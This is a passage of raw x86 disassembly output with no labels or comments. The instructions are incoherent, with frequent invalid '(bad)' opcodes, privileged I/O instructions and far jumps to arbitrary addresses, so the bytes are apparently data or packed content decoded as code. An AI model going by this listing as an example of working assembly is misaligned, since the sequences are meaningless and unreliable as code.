  40c659:	sub    eax,0x9761fa8a
  40c65e:	mov    esi,0xc1374cb0
  40c663:	cmc    
  40c664:	daa    
  40c665:	xchg   esp,eax
  40c666:	rcl    dl,1
  40c668:	out    0xd1,al
  40c66a:	dec    ecx
  40c66b:	int    0xea
  40c66d:	std    
  40c66e:	sub    al,0x68
  40c670:	data16 icebp 
  40c672:	scas   eax,DWORD PTR es:[edi]
  40c673:	sti    
  40c674:	and    edx,ecx
  40c676:	sysret 
  40c678:	xor    al,BYTE PTR [ebx+0x1]
  40c67b:	test   al,0x25
  40c67e:	stos   DWORD PTR es:[edi],eax
  40c67f:	js     0x40c6ac
  40c681:	xchg   al,dh
  40c683:	pop    ebp
  40c684:	adc    al,BYTE PTR [esp+edx*2+0x7a783f]
  40c68b:	das    
  40c68c:	lods   eax,DWORD PTR ds:[esi]
  40c68d:	dec    ecx
  40c68e:	or     ebp,DWORD PTR [ecx]
  40c690:	jb     0x40c69c
  40c692:	mov    esi,0x40d07614
  40c697:	ror    DWORD PTR [ecx],0x6e
  40c69a:	add    eax,0x5e3592f0
  40c69f:	outs   dx,DWORD PTR ds:[esi]
  40c6a0:	xlat   BYTE PTR ds:[ebx]
  40c6a1:	adc    DWORD PTR [esi-0x5b],0x5
  40c6a5:	jp     0x40c70c
  40c6a7:	frstor [edx-0x33]
  40c6aa:	out    dx,eax
  40c6ab:	jp     0x40c70a
  40c6ad:	inc    ecx
  40c6ae:	jmp    0x40c67b
  40c6b0:	nop
  40c6b1:	pop    ds
  40c6b2:	push   ecx
  40c6b3:	xlat   BYTE PTR ds:[ebx]
  40c6b4:	std    
  40c6b5:	fiadd  WORD PTR [edi-0x4e]
  40c6b8:	or     DWORD PTR ds:0x98ec60e2,ebx
  40c6be:	outs   dx,BYTE PTR ds:[esi]
  40c6bf:	pop    edi
  40c6c0:	mov    edi,0x2d91cb27
  40c6c5:	imul   ecx,DWORD PTR [edi+ebx*4],0x71
  40c6c9:	cmp    ch,ch
  40c6cb:	mov    ds:0x22b6036c,eax
  40c6d0:	xchg   BYTE PTR [ebp-0x39],dh
  40c6d3:	xor    DWORD PTR [ebp+0xbd6d41],0x79bdb3fc
  40c6dd:	inc    edi
  40c6de:	jmp    0xec57:0x509cddd2
  40c6e5:	jg     0x40c733
  40c6e7:	mov    esi,0x2a8e0569
  40c6ec:	mov    esp,0x76ca09fe
  40c6f1:	into   
  40c6f2:	retf   
  40c6f3:	mov    eax,0xa495765
  40c6f8:	or     BYTE PTR [ecx+edi*2+0x168eef58],dl
  40c6ff:	or     edx,DWORD PTR [edx-0x4]
  40c702:	mov    edx,0x2c1ca075
  40c707:	xor    DWORD PTR [edi-0x3b],ebx
  40c70a:	sub    bh,BYTE PTR [edi-0x44aeeeb]
  40c710:	or     eax,0x66688b1a
  40c715:	cmp    ch,BYTE PTR ds:0xccce991
  40c71b:	fwait
  40c71c:	xor    al,0x70
  40c71e:	and    eax,0xf44bd1c0
  40c723:	and    eax,0xd3edf3b8
  40c728:	(bad)  
  40c729:	fadd   DWORD PTR [di-0xb]
  40c72d:	arpl   WORD PTR [ebx-0xd],bx
  40c730:	in     al,0xe8
  40c732:	sub    BYTE PTR [eax+0x7ccbf2be],bl
  40c738:	pop    edi
  40c739:	push   ds
  40c73a:	scas   al,BYTE PTR es:[edi]
  40c73b:	xlat   BYTE PTR ds:[ebx]
  40c73c:	lahf   
  40c73d:	lds    eax,FWORD PTR [ecx+0x19]
  40c740:	test   BYTE PTR [edx],0x18
  40c743:	or     eax,0x64447ee3
  40c748:	sbb    eax,0xf2baaec4
  40c74d:	das    
  40c74e:	jne    0x40c727
  40c750:	out    dx,eax
  40c751:	mov    esi,0xa3a3b204
  40c756:	daa    
  40c757:	push   ebp
  40c758:	mov    ch,BYTE PTR [ebp+0x6a]
  40c75b:	mov    esp,0x8a9a800b
  40c760:	(bad)  
  40c761:	gs mov ebp,0x894db42b
  40c767:	push   0x1c
  40c769:	adc    eax,0x119fc1b
  40c76e:	ds add eax,0x85a9b2b8
  40c774:	repnz and BYTE PTR [ecx],0x20
  40c778:	rcr    al,cl
  40c77a:	rcr    DWORD PTR [ebx-0xfc320a8],1
  40c780:	arpl   sp,cx
  40c782:	push   edi
  40c783:	push   edx
  40c784:	(bad)  
  40c785:	out    0x15,al
  40c787:	fbstp  TBYTE PTR [ecx-0x596cfec6]
  40c78d:	or     esi,edi
  40c78f:	fld    TBYTE PTR [edx]
  40c791:	call   0xc4169c9b
  40c796:	into   
  40c797:	call   0xc8380ee3
  40c79c:	frstpm(287 only) 
  40c79e:	(bad)  
  40c79f:	cmp    al,0x29
  40c7a1:	mov    WORD PTR [edx-0x5befa332],cs
  40c7a7:	pop    edx
  40c7a8:	pop    ds
  40c7a9:	mov    ds:0x248a8df8,eax
  40c7ae:	inc    esi
  40c7af:	aad    0xf5
  40c7b1:	cmp    DWORD PTR ds:0xf86d3362,ebp
  40c7b7:	add    DWORD PTR [edi+edi*2-0x227d13e],ebx
  40c7be:	push   cs
  40c7bf:	add    bl,BYTE PTR [esp+edi*1-0x3b53eed2]
  40c7c6:	jp     0x40c7e1
  40c7c8:	out    0x55,al
  40c7ca:	inc    ebp
  40c7cb:	fadd   QWORD PTR [eax]
  40c7cd:	xchg   esp,eax
  40c7ce:	in     eax,dx
  40c7cf:	mov    dl,0x96
  40c7d1:	fnstenv [esi+edx*8+0x26]
  40c7d5:	test   eax,0xe695a08e
  40c7da:	or     ah,dh
  40c7dc:	xchg   ecx,esi
  40c7de:	repz jnp 0x40c7a1
  40c7e1:	sahf   
  40c7e2:	add    esi,eax
  40c7e4:	add    DWORD PTR [esi+0x67],0x57
  40c7e8:	fldcw  WORD PTR [edi+0x658fedcd]
  40c7ee:	push   cs
  40c7ef:	addr16 jp 0x40c816
  40c7f2:	add    ah,BYTE PTR [ecx-0x47]
  40c7f5:	mov    ds:0xe1b1b219,al
  40c7fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7fb:	mov    ds:0x78026d90,al
  40c800:	mov    edi,0xd91163a5
  40c805:	loope  0x40c832
  40c807:	in     al,dx
  40c808:	push   ebx
  40c809:	or     al,bh
  40c80b:	in     al,dx
  40c80c:	addr16 dec esp
  40c80e:	icebp  
  40c80f:	mov    eax,ds:0x774c0a6f
  40c814:	sub    esp,0x210cf3b6
  40c81a:	jae    0x40c7ef
  40c81c:	xlat   BYTE PTR ds:[ebx]
  40c81d:	jge    0x40c887
  40c81f:	gs jp  0x40c7fe
  40c822:	loop   0x40c895
  40c824:	cmp    BYTE PTR [esi+ebx*1],dh
  40c827:	push   0xffffffa3
  40c829:	and    ebp,DWORD PTR [ebx-0x49]
  40c82c:	out    dx,eax
  40c82d:	test   al,0x50
  40c82f:	lods   eax,DWORD PTR ds:[esi]
  40c830:	push   0xffc66b91
  40c835:	fisttp QWORD PTR [ebx-0x4c7003fa]
  40c83b:	mov    bl,0x92
  40c83d:	lea    ecx,[edi]
  40c83f:	dec    edx
  40c840:	sbb    al,0xf8
  40c842:	sub    DWORD PTR [eax+edi*4],esi
  40c845:	mov    bl,0x6b
  40c847:	dec    ebp
  40c848:	subps  xmm3,XMMWORD PTR [edi+0x4d]
  40c84c:	mov    ds:0xf32d135c,al
  40c851:	rcr    esp,cl
  40c853:	mov    ds:0xa7de57c,eax
  40c858:	cld    
  40c859:	lds    ebp,FWORD PTR [esi+0x3b]
  40c85c:	shl    DWORD PTR [ebx+edi*4+0x70],cl
  40c860:	es and edx,esi
  40c863:	push   ebp
  40c864:	enter  0x286c,0xa6
  40c868:	imul   esi,DWORD PTR [edi],0x54
  40c86b:	xor    BYTE PTR [edi+0x79],ah
  40c86e:	inc    ecx
  40c86f:	mov    bl,0x69
  40c871:	retf   
  40c872:	loope  0x40c8c7
  40c874:	and    edi,DWORD PTR [eax]
  40c876:	je     0x40c846
  40c878:	dec    edi
  40c879:	leave  
  40c87a:	jp     0x40c8d5
  40c87c:	and    eax,edx
  40c87e:	cmp    DWORD PTR [ebx-0x66cb2104],ebx
  40c884:	xor    al,0xee
  40c886:	jbe    0x40c8e4
  40c888:	ror    DWORD PTR ds:0xfe9ffc03,cl
  40c88e:	ds std 
  40c890:	mov    cs,WORD PTR [eax-0x2c5365f4]
  40c896:	out    0x27,al
  40c898:	mov    BYTE PTR [ebp-0x2ec8a74],ch
  40c89e:	das    
  40c89f:	add    esi,DWORD PTR [ebp+0x54]
  40c8a2:	cmp    al,0x57
  40c8a4:	aad    0x9d
  40c8a6:	cmp    ebx,DWORD PTR [ebp+0x68]
  40c8a9:	sbb    DWORD PTR [edx+0x5a],0xdd9ca7cc
  40c8b0:	inc    ebx
  40c8b1:	and    al,0xb2
  40c8b3:	clc    
  40c8b4:	adc    DWORD PTR [edi],eax
  40c8b6:	mov    ebx,0xa2f6bdb5
  40c8bb:	mov    BYTE PTR [esi-0x7f746401],bh
  40c8c1:	daa    
  40c8c2:	jae    0x40c8b0
  40c8c4:	mov    edi,0x3fe9155f
  40c8c9:	sub    edi,DWORD PTR [edx+0xba612a7]
  40c8cf:	js     0x40c886
  40c8d1:	(bad)  
  40c8d2:	jl     0x40c92a
  40c8d4:	mov    ch,0x2
  40c8d6:	pop    ebx
  40c8d7:	jp     0x40c88b
  40c8d9:	call   0xb03fc0de
  40c8de:	cmc    
  40c8df:	sub    DWORD PTR ds:0xe39c2f77,ecx
  40c8e5:	js     0x40c902
  40c8e7:	loopne 0x40c889
  40c8e9:	xchg   esp,eax
  40c8ea:	xchg   ebp,eax
  40c8eb:	adc    BYTE PTR [ecx],ah
  40c8ed:	ins    DWORD PTR es:[edi],dx
  40c8ee:	ss jb  0x40c875
  40c8f1:	sbb    eax,0x90552bed
  40c8f6:	mov    DWORD PTR [esi],ecx
  40c8f8:	aaa    
  40c8f9:	or     BYTE PTR [ebp-0x7927e43],0x8e
  40c900:	mov    cs,WORD PTR [ebx+ecx*4-0x3b]
  40c904:	(bad)  
  40c905:	push   esp
  40c906:	inc    eax
  40c907:	mov    esp,0xc93a0ee2
  40c90c:	ficomp DWORD PTR [ecx]
  40c90e:	inc    ecx
  40c90f:	ret    0x8e11
  40c912:	pop    edi
  40c913:	jno    0x40c89b
  40c915:	or     eax,0xde90af1
  40c91a:	xor    al,0x6a
  40c91c:	into   
  40c91d:	xor    DWORD PTR [ebx],ebp
  40c91f:	inc    ecx
  40c920:	mov    esp,ebp
  40c922:	pop    DWORD PTR [ecx-0x4]
  40c925:	jae    0x40c90c
  40c927:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40c929:	retf   0x1571
  40c92c:	push   esi
  40c92d:	fcom   QWORD PTR [ecx-0x4bb1beb7]
  40c933:	popa   
  40c934:	(bad)  
  40c935:	mov    esi,0x17b9bdd9
  40c93a:	cmp    al,0xf2
  40c93c:	js     0x40c8d1
  40c93e:	adc    eax,0x56cfb0da
  40c943:	inc    esi
  40c944:	stc    
  40c945:	pushf  
  40c946:	adc    bl,BYTE PTR [esi]
  40c948:	sub    ebx,DWORD PTR [ebp-0x49]
  40c94b:	loop   0x40c9b7
  40c94d:	sbb    cl,BYTE PTR [edx]
  40c94f:	cmp    al,0xe8
  40c951:	push   edx
  40c952:	call   0x65cb:0x2c973bb9
  40c959:	vpand  xmm2,xmm0,XMMWORD PTR [edx-0x429681ff]
  40c961:	pop    ebx
  40c962:	jmp    0xfd84:0x77b475c8
  40c969:	imul   DWORD PTR [edx-0x7d4bd0b7]
  40c96f:	add    ebx,DWORD PTR [edx]
  40c971:	xor    BYTE PTR [ebp+0x4d90b89d],0x4a
  40c978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c979:	lea    esi,[ecx]
  40c97b:	sub    ah,BYTE PTR [eax-0x2fb84647]
  40c981:	leave  
  40c982:	xlat   BYTE PTR ds:[ebx]
  40c983:	fisttp WORD PTR [ecx]
  40c985:	xor    esi,ecx
  40c987:	mov    ?,WORD PTR [edi-0x44]
  40c98a:	xchg   ecx,eax
  40c98b:	shl    BYTE PTR [edx-0x4f],cl
  40c98e:	lea    ebp,[edx+esi*2-0x3c]
  40c992:	and    BYTE PTR [eax-0x1e08576],0xf1
  40c999:	les    edi,FWORD PTR [edx+0x64e0120a]
  40c99f:	and    ch,BYTE PTR [eax+0x1180dbda]
  40c9a5:	add    al,0xcf
  40c9a7:	adc    eax,0x3ada13b8
  40c9ac:	mov    eax,0xa68a165a
  40c9b1:	and    ch,BYTE PTR [esi]
  40c9b3:	mul    DWORD PTR [ecx+0x72801643]
  40c9b9:	std    
  40c9ba:	ins    DWORD PTR es:[edi],dx
  40c9bb:	scas   eax,DWORD PTR es:[edi]
  40c9bc:	fs retf 0xe36
  40c9c0:	test   al,0xd
  40c9c2:	adc    ebx,eax
  40c9c4:	cmp    bl,ch
  40c9c6:	sbb    dl,dl
  40c9c8:	push   eax
  40c9c9:	pop    ebp
  40c9ca:	ss pop ds
  40c9cc:	xchg   edx,eax
  40c9cd:	hlt    
  40c9ce:	add    ecx,DWORD PTR [ebx+0x3b]
  40c9d1:	dec    esi
  40c9d2:	inc    ebp
  40c9d3:	jns    0x40c9b9
  40c9d5:	jmp    0x97caaf6a
  40c9da:	add    esi,ebx
  40c9dc:	(bad)  
  40c9dd:	idiv   BYTE PTR [esi]
  40c9df:	sahf   
  40c9e0:	inc    esi
  40c9e1:	mov    al,ds:0xe9e9e602
  40c9e6:	dec    ecx
  40c9e7:	jle    0x40c9d9
  40c9e9:	xchg   ebx,eax
  40c9ea:	(bad)  
  40c9eb:	sahf   
  40c9ec:	stos   DWORD PTR es:[edi],eax
  40c9ed:	in     eax,dx
  40c9ee:	ret    
  40c9ef:	aad    0x42
  40c9f1:	adc    BYTE PTR [edi+0x3fcd4ccb],ah
  40c9f7:	retf   
  40c9f8:	sbb    esp,esi
  40c9fa:	dec    eax
  40c9fb:	popa   
  40c9fc:	dec    esi
  40c9fd:	inc    ebp
  40c9fe:	xchg   dh,bl
  40ca00:	icebp  
  40ca01:	or     al,0x7b
  40ca03:	es inc ebx
  40ca05:	int3   
  40ca06:	int3   
  40ca07:	push   eax
  40ca08:	adc    BYTE PTR [edx+0xa703ce0],dh
  40ca0e:	nop    DWORD PTR [ebp+0xf3590d]
  40ca15:	(bad)  
  40ca16:	push   edi
  40ca17:	push   ebx
  40ca18:	aam    0x4d
  40ca1a:	icebp  
  40ca1b:	cmc    
  40ca1c:	jg     0x40c9da
  40ca1e:	push   eax
  40ca1f:	pop    ebp
  40ca20:	xchg   BYTE PTR [eax-0x2a],dh
  40ca23:	sbb    ecx,DWORD PTR [eax]
  40ca25:	imul   edi,DWORD PTR [edi],0xae7a12ff
  40ca2b:	ins    DWORD PTR es:[edi],dx
  40ca2c:	mov    ecx,0xa3ba7779
  40ca31:	mov    BYTE PTR [ebx-0x4e],ch
  40ca34:	pop    eax
  40ca35:	aas    
  40ca36:	pop    edi
  40ca37:	fs test al,0x2e
  40ca3a:	cmp    ebp,0xffffff8c
  40ca3d:	mov    al,0xcf
  40ca3f:	jae    0x40c9ff
  40ca41:	call   0x2646195c
  40ca46:	test   al,0x54
  40ca48:	mov    edi,0x97b9dfb3
  40ca4d:	jmp    0x7ad0:0x866a9528
  40ca54:	or     eax,0x3082875f
  40ca59:	and    eax,esi
  40ca5b:	shl    BYTE PTR [ebp+0x7],0x25
  40ca5f:	dec    edx
  40ca60:	xchg   BYTE PTR [esi-0x72dd3def],al
  40ca66:	icebp  
  40ca67:	pop    ss
  40ca68:	cmp    eax,0x361ac4d3
  40ca6d:	hlt    
  40ca6e:	imul   DWORD PTR ds:0xbc5943cc
  40ca74:	aaa    
  40ca75:	xor    edi,ecx
  40ca77:	neg    edx
  40ca79:	in     al,0x98
  40ca7b:	clc    
  40ca7c:	inc    ebp
  40ca7d:	stos   DWORD PTR es:[edi],eax
  40ca7e:	clc    
  40ca7f:	ret    
  40ca80:	jmp    0xb6d01ed3
  40ca85:	mov    esp,0xaeddca2d
  40ca8a:	mov    esi,0xf0bada44
  40ca8f:	mov    bh,0xf8
  40ca91:	neg    bh
  40ca93:	(bad)  
  40ca94:	push   esp
  40ca95:	cdq    
  40ca96:	fidivr DWORD PTR [ebx]
  40ca98:	mov    ds:0x43d9301c,eax
  40ca9d:	jecxz  0x40cb10
  40ca9f:	add    ah,bl
  40caa1:	fsubr  DWORD PTR [edi+0x41d80d6c]
  40caa7:	aam    0xb1
  40caa9:	xor    bh,ch
  40caab:	cmp    eax,0xcbd2bf16
  40cab0:	jle    0x40ca8a
  40cab2:	call   0x30b2e4c2
  40cab7:	int3   
  40cab8:	dec    edx
  40cab9:	test   dh,0xe
  40cabc:	jne    0x40ca6d
  40cabe:	sbb    BYTE PTR [ebp+0x6d8e7872],bh
  40cac4:	cwde   
  40cac5:	stc    
  40cac6:	call   0x30ce940
  40cacb:	(bad)  
  40cacc:	sbb    BYTE PTR [esi+0x40],dl
  40cacf:	imul   ebp,edx,0xffffff89
  40cad2:	dec    eax
  40cad3:	fstp   DWORD PTR [eax-0x68]
  40cad6:	and    edx,DWORD PTR [eax-0x4a]
  40cad9:	cli    
  40cada:	leavew 
  40cadc:	test   dh,al
  40cade:	repnz leave 
  40cae0:	adc    eax,0xa382dcd8
  40cae5:	pop    ecx
  40cae6:	addr16 mov ebx,0x7ef1735c
  40caed:	push   es
  40caee:	push   cx
  40caf0:	pushf  
  40caf1:	std    
  40caf2:	and    al,0x0
  40caf4:	inc    edi
  40caf5:	fiadd  WORD PTR [eax]
  40caf7:	jne    0x40cac8
  40caf9:	adc    cl,ch
  40cafb:	cld    
  40cafc:	retf   
  40cafd:	cmp    eax,DWORD PTR [ecx+0x50b4ef10]
  40cb03:	pop    ds
  40cb04:	in     eax,dx
  40cb05:	mov    cl,0x71
  40cb07:	sti    
  40cb08:	repnz adc DWORD PTR [edx+eiz*8+0x6322863b],ebx
  40cb10:	stc    
  40cb11:	les    ebx,FWORD PTR [ebx+0xeb3d950]
  40cb17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb18:	iret   
  40cb19:	pop    edx
  40cb1a:	xchg   DWORD PTR [eax+0x20],ebp
  40cb1d:	sbb    ch,BYTE PTR [edx]
  40cb1f:	in     eax,dx
  40cb20:	out    dx,al
  40cb21:	add    DWORD PTR [edi+edx*4+0x1a65559f],ecx
  40cb28:	inc    esi
  40cb29:	xor    bl,BYTE PTR [edi]
  40cb2b:	ss or  al,0xb7
  40cb2e:	outs   dx,BYTE PTR ds:[esi]
  40cb2f:	add    cl,BYTE PTR [ecx]
  40cb31:	call   DWORD PTR [ecx+eiz*4-0x449484c4]
  40cb38:	sub    dl,bh
  40cb3a:	add    eax,0x381da0a3
  40cb3f:	mov    dl,BYTE PTR [ecx+0x68]
  40cb42:	hlt    
  40cb43:	or     BYTE PTR [edx-0x74],al
  40cb46:	cmp    BYTE PTR [edx+ecx*4+0x757175bd],ch
  40cb4d:	ret    0x21d
  40cb50:	sar    BYTE PTR [eax+0x79cd02b4],cl
  40cb56:	xchg   edx,eax
  40cb57:	and    edx,DWORD PTR [edi+0x444bb580]
  40cb5d:	lods   al,BYTE PTR ds:[esi]
  40cb5e:	pop    eax
  40cb5f:	and    al,0xcf
  40cb61:	dec    ebp
  40cb62:	xchg   ecx,eax
  40cb63:	push   edi
  40cb64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb65:	int    0x62
  40cb67:	mov    BYTE PTR [ebx+eiz*4+0x2eebf2dc],dl
  40cb6e:	jg     0x40cbed
  40cb70:	pop    ss
  40cb71:	cwde   
  40cb72:	call   0xfd9ff119
  40cb77:	and    edx,esp
  40cb79:	clc    
  40cb7a:	mov    al,ds:0x43490a98
  40cb7f:	icebp  
  40cb80:	lods   al,BYTE PTR ds:[esi]
  40cb81:	and    BYTE PTR [ecx+0x34],dh
  40cb84:	loopne 0x40cb28
  40cb86:	sub    al,0x6
  40cb88:	stos   DWORD PTR es:[edi],eax
  40cb89:	cmp    edi,DWORD PTR [esi-0x3c849a1d]
  40cb8f:	fcmovnu st,st(3)
  40cb91:	xchg   edi,eax
  40cb92:	jno    0x40cbb4
  40cb94:	sahf   
  40cb95:	inc    ebp
  40cb96:	lea    esp,[eax+esi*2-0x6e]
  40cb9a:	lock adc al,0x2b
  40cb9d:	sahf   
  40cb9e:	rcr    DWORD PTR [edi-0x21],1
  40cba1:	pop    esi
  40cba2:	fidiv  DWORD PTR [ebx+0x7e]
  40cba5:	sub    esp,esp
  40cba7:	and    al,0x2c
  40cba9:	cmp    DWORD PTR [ebp+0x260201c1],ecx
  40cbaf:	sbb    al,0x8a
  40cbb1:	mov    esi,0xf14270d5
  40cbb6:	mov    bl,0x8b
  40cbb8:	add    eax,0x9f61fb86
  40cbbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbbe:	cli    
  40cbbf:	xchg   DWORD PTR [edx],eax
  40cbc1:	ja     0x40cb7d
  40cbc3:	dec    esi
  40cbc4:	mov    dh,0x26
  40cbc6:	sbb    BYTE PTR [ecx],0xb4
  40cbc9:	arpl   WORD PTR [edi],si
  40cbcb:	das    
  40cbcc:	xchg   ecx,eax
  40cbcd:	xchg   ebp,eax
  40cbce:	addr16 sahf 
  40cbd0:	pop    ebp
  40cbd1:	mov    ah,0xf3
  40cbd3:	mov    esi,0x1d7064a9
  40cbd8:	les    ebp,FWORD PTR [ebx]
  40cbda:	push   0xffffffb2
  40cbdc:	(bad)  
  40cbdd:	pop    eax
  40cbde:	cmp    DWORD PTR [ebp+ebx*1+0x19],ebx
  40cbe2:	mov    ebx,0x42a79c11
  40cbe7:	mov    esp,0x88df0cf6
  40cbec:	jb     0x40cc28
  40cbee:	fcomp  DWORD PTR [edx+0x610ddc6]
  40cbf4:	mov    ds:0x6b4bc49,al
  40cbf9:	sub    eax,0x627145ee
  40cbfe:	xor    cl,ah
  40cc00:	push   es
  40cc01:	push   ecx
  40cc02:	sbb    esi,esi
  40cc04:	jg     0x40cbf2
  40cc06:	jo     0x40cbdc
  40cc08:	jge    0x40cb9a
  40cc0a:	jp     0x40cb8d
  40cc0c:	mov    ch,ah
  40cc0e:	ja     0x40cc31
  40cc10:	mov    esp,0x3bbe8d68
  40cc15:	aaa    
  40cc16:	adc    esp,esi
  40cc18:	pop    ebx
  40cc19:	jp     0x40cbab
  40cc1b:	ror    BYTE PTR [ecx+0x186af359],1
  40cc21:	adc    BYTE PTR [ebp+0x38],0x35
  40cc25:	pushf  
  40cc26:	or     eax,0xd28708da
  40cc2b:	ror    BYTE PTR [ecx-0x3d],1
  40cc2e:	je     0x40cbe6
  40cc30:	adc    DWORD PTR [eax+0x32],ebx
  40cc33:	ds int3 
  40cc35:	test   DWORD PTR [ecx+ebp*4],0x2be19f50
  40cc3c:	test   BYTE PTR [eax-0x13426076],al
  40cc42:	mov    ebx,0xb54fc367
  40cc47:	dec    edi
  40cc48:	(bad)  
  40cc49:	push   edx
  40cc4a:	ret    
  40cc4b:	rcl    BYTE PTR [edx],0xf5
  40cc4e:	repz xchg edi,eax
  40cc50:	das    
  40cc51:	repz test eax,0x7b108de6
  40cc57:	retf   0xcbbb
  40cc5a:	jnp    0x40cc11
  40cc5c:	and    al,0x71
  40cc5e:	sub    DWORD PTR [edi-0x57],edi
  40cc61:	dec    edx
  40cc62:	xor    ah,BYTE PTR [esi-0x5eb38f2a]
  40cc68:	outs   dx,DWORD PTR ds:[esi]
  40cc69:	fist   WORD PTR [eax+ebx*4+0x3327b403]
  40cc70:	mov    eax,0xb6f9b0a6
  40cc75:	xchg   ecx,eax
  40cc76:	shl    edi,1
  40cc78:	retf   
  40cc79:	fimul  WORD PTR [esp+ecx*8]
  40cc7c:	leave  
  40cc7d:	mov    dh,0x4d
  40cc7f:	cmp    edi,DWORD PTR [ebx]
  40cc81:	(bad)  
  40cc82:	ins    BYTE PTR es:[edi],dx
  40cc83:	mov    ecx,0xee74c968
  40cc88:	setge  BYTE PTR [esi]
  40cc8b:	jmp    0x2dbe0c19
  40cc90:	popf   
  40cc91:	imul   eax,DWORD PTR [eax+0x16ab46fd],0x4bfc5685
  40cc9b:	bound  edi,QWORD PTR [ecx-0x254367b4]
  40cca1:	jmp    0x40ccac
  40cca3:	or     ebp,eax
  40cca5:	stos   BYTE PTR es:[edi],al
  40cca6:	sbb    ebx,DWORD PTR [edi]
  40cca8:	dec    esp
  40cca9:	les    edx,FWORD PTR [edi]
  40ccab:	daa    
  40ccac:	cmp    al,0xb0
  40ccae:	push   0x353803c4
  40ccb3:	lods   al,BYTE PTR ds:[esi]
  40ccb4:	test   BYTE PTR [ecx-0x28],cl
  40ccb7:	mov    ah,0xb3
  40ccb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccba:	stos   BYTE PTR es:[edi],al
  40ccbb:	jae    0x40cc98
  40ccbd:	not    DWORD PTR [eax+0x7d8d0d55]
  40ccc3:	xor    al,0xae
  40ccc5:	xchg   ebx,eax
  40ccc7:	adc    eax,0x8adb0d0b
  40cccc:	add    al,0x9d
  40ccce:	xlat   BYTE PTR ds:[ebx]
  40cccf:	sti    
  40ccd0:	rol    bl,0x28
  40ccd3:	iret   
  40ccd4:	pop    edi
  40ccd5:	inc    ebp
  40ccd6:	dec    ebx
  40ccd7:	sbb    al,0xd9
  40ccd9:	dec    BYTE PTR [eax+ebx*4-0x5b]
  40ccdd:	cmp    al,0xbd
  40ccdf:	leave  
  40cce0:	push   ebp
  40cce1:	nop
  40cce2:	inc    ebx
  40cce3:	sub    al,0x72
  40cce5:	sbb    eax,0x72ad7e0e
  40ccea:	sub    eax,0x84ee254
  40ccef:	pmaxub mm6,QWORD PTR [ebx+eiz*2+0x12]
  40ccf4:	imul   ebx,DWORD PTR [ebx+0x48],0x9b91eb3a
  40ccfb:	leave  
  40ccfc:	ins    BYTE PTR es:[edi],dx
  40ccfd:	mov    ecx,0xf1b493de
  40cd02:	inc    ebp
  40cd03:	not    DWORD PTR [esi+0x6a]
  40cd06:	pop    esp
  40cd07:	imul   edi,DWORD PTR [ebp+0x11],0x7d92b94f
  40cd0e:	neg    BYTE PTR [ecx+0x2d6d169b]
  40cd14:	add    BYTE PTR [edi+0x6f],bl
  40cd17:	outs   dx,BYTE PTR ds:[esi]
  40cd18:	bound  ebp,QWORD PTR [ebx-0x68]
  40cd1b:	daa    
  40cd1c:	fxch   st(0)
  40cd1e:	add    cl,cl
  40cd20:	add    bh,BYTE PTR [edx]
  40cd22:	cmp    dh,bh
  40cd24:	mov    dl,0xc6
  40cd26:	cli    
  40cd27:	adc    DWORD PTR [esi+edx*4+0x32],0x63b3a3f3
  40cd2f:	pop    esp
  40cd30:	jnp    0x40cd66
  40cd32:	neg    BYTE PTR [edi+0x4ef8093]
  40cd38:	aad    0xd0
  40cd3a:	and    ch,BYTE PTR [ebx-0x76]
  40cd3d:	mov    cs,edx
  40cd3f:	(bad)  
  40cd40:	jp     0x40cd9d
  40cd42:	mov    esp,0xdf56e606
  40cd47:	scas   eax,DWORD PTR es:[edi]
  40cd48:	clc    
  40cd49:	xchg   esi,eax
  40cd4a:	xor    al,bh
  40cd4c:	jae    0x40cd29
  40cd4e:	mov    cl,0x8a
  40cd50:	add    DWORD PTR gs:[ebx+0x1656d361],edx
  40cd57:	repz sbb al,0xe4
  40cd5a:	cld    
  40cd5b:	jl     0x40cd2e
  40cd5d:	pop    ebp
  40cd5e:	jmp    0x9b48ebdc
  40cd63:	xor    edx,ebp
  40cd65:	call   0xcae9:0x6e37dbd9
  40cd6c:	mov    ds:0x918134e2,eax
  40cd71:	sub    ebx,ebx
  40cd73:	or     eax,0xb20493a8
  40cd78:	addr16 loop 0x40cdcb
  40cd7b:	cmp    ch,0x7c
  40cd7e:	xchg   ecx,eax
  40cd7f:	pop    ds
  40cd80:	xchg   ecx,eax
  40cd81:	lea    esi,[ecx-0xd4260a6]
  40cd87:	addr16 push es
  40cd89:	inc    edi
  40cd8a:	jne    0x40cd99
  40cd8c:	in     eax,dx
  40cd8d:	aas    
  40cd8e:	mov    ds:0x8d0cc243,eax
  40cd93:	and    DWORD PTR [esi],0xbf89674e
  40cd99:	in     eax,0x3b
  40cd9b:	cld    
  40cd9c:	retf   0x85ae
  40cd9f:	frstor [edx]
  40cda1:	jmp    FWORD PTR [ebx+ebp*8+0x3e2f550e]
  40cda8:	imul   ebx,edx,0xc518f584
  40cdae:	push   edi
  40cdaf:	adc    DWORD PTR [ebx-0x26],0x72
  40cdb3:	mov    esp,0xa516a6c0
  40cdb8:	mov    ecx,0x2590aca4
  40cdbd:	add    DWORD PTR [ebp+0x127f60b5],0x2e
  40cdc4:	int3   
  40cdc5:	jmp    ebp
  40cdc7:	mov    al,0x83
  40cdc9:	jmp    0xb052:0xb80b37cf
  40cdd0:	mov    cl,0xc4
  40cdd2:	nop
  40cdd3:	cli    
  40cdd4:	mov    ds:0xbd57f1c7,eax
  40cdd9:	xor    edi,DWORD PTR [ebx]
  40cddb:	dec    esp
  40cddc:	mov    ecx,0x851e15ce
  40cde1:	fisubr DWORD PTR [ebx+0x7305b3ec]
  40cde7:	adc    DWORD PTR [eax],eax
  40cde9:	push   es
  40cdea:	mov    al,ds:0xb639fbd6
  40cdef:	pop    es
  40cdf0:	pop    ecx
  40cdf1:	test   eax,esi
  40cdf3:	ds xchg edx,eax
  40cdf5:	test   eax,0xcb64b903
  40cdfa:	dec    eax
  40cdfb:	mov    ds,esi
  40cdfd:	push   edi
  40cdfe:	xchg   ebx,eax
  40ce00:	xchg   edi,eax
  40ce01:	pop    esp
  40ce02:	sbb    ecx,DWORD PTR [edi-0x2ee4484e]
  40ce08:	xchg   esi,eax
  40ce09:	sub    al,0x51
  40ce0b:	mov    WORD PTR ds:0xa6a5299,fs
